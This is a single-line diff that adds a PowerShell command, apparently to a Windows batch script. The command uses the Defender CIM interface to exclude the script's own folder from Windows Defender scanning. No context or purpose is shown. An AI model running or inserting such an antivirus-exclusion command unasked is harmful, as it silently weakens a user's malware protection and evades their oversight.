@@ -1,0 +1,1 @@
+powershell "try {$null = icim MSFT_MpPreference @{ExclusionPath = @('%~dp0'); Force = $True} Add -Namespace root/Microsoft/Windows/Defender -EA 1} catch {$host.SetShouldExit($_.Exception.HResult)}"
